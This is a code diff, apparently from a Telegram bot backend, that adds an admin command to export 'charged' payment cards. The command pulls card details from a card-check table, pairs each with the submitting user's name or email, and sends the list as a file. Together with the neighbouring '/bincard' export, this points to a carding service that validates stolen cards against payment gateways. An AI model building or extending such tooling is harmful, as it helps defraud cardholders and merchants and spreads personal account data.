@@ -5468,6 +5468,62 @@ ${profile.is_banned && profile.ban_reason ? `• Reason: ${profile.ban_reason}` 
       return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
     }
 
+    // /chargedcards - Export charged cards only
+    if (text === "/chargedcards") {
+      const isAdmin = await isAdminAsync(chatId, supabase);
+      if (!isAdmin) {
+        await sendTelegramMessage(chatId, "❌ <b>Access Denied</b>\n\nOnly admins can use this command.");
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      await sendTelegramMessage(chatId, "⏳ <b>Fetching charged cards...</b>\n\nPlease wait while I prepare the file.");
+
+      const { data: cards, error } = await supabase
+        .from("card_checks")
+        .select("card_details, gateway, created_at, user_id, result")
+        .ilike("result", "%charged%")
+        .order("created_at", { ascending: false });
+
+      if (error || !cards || cards.length === 0) {
+        await sendTelegramMessage(chatId, "❌ <b>No charged cards found</b>\n\nThere are no charged card records in the database.");
+        return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+      }
+
+      // Get unique user IDs and fetch their profiles
+      const userIds = [...new Set(cards.map((c: any) => c.user_id))];
+      const { data: profiles } = await supabase
+        .from("profiles")
+        .select("user_id, username")
+        .in("user_id", userIds);
+
+      const { data: authData } = await supabase.auth.admin.listUsers();
+      const emailMap = new Map<string, string>();
+      if (authData?.users) {
+        authData.users.forEach((u: any) => emailMap.set(u.id, u.email || ""));
+      }
+
+      const userMap = new Map<string, string>();
+      profiles?.forEach((p: any) => {
+        const email = emailMap.get(p.user_id) || "";
+        userMap.set(p.user_id, p.username || email || p.user_id);
+      });
+
+      const fileContent = cards.map((c: any) => {
+        const user = userMap.get(c.user_id) || c.user_id || "Unknown";
+        return `${c.card_details || "Unknown"} | ${user}`;
+      }).join("\n");
+      const filename = `charged_cards_${new Date().toISOString().split("T")[0]}.txt`;
+
+      await sendTelegramDocument(
+        chatId,
+        fileContent,
+        filename,
+        `📁 <b>Charged Cards Export</b>\n\n💳 Total Charged Cards: ${cards.length}\n\n<i>Format: card | user</i>`
+      );
+
+      return new Response(JSON.stringify({ ok: true }), { headers: { ...corsHeaders, "Content-Type": "application/json" } });
+    }
+
     // /bincard <bin> - Export cards by BIN (first 6 digits)
     if (text.startsWith("/bincard")) {
       const isAdmin = await isAdminAsync(chatId, supabase);
